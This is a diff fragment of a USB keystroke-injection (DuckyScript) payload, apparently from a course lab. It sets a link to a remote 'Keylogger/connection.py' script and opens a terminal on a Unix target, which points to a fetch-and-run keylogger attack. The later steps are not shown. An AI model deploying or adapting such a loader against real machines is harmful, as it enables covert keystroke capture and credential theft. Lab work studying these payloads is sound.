@@ -3,7 +3,7 @@ REM Target: UNIX
 
 REM Requirements: internet connection
 REM put link to script
-DEFINE #PYTHON_SCRIPT-LINK https://www.
+DEFINE #PYTHON_SCRIPT-LINK https://github.com/butlersl/305-lab-files/blob/main/Keylogger/connection.py
 
 DELAY 1000
 CTRL-ALT t
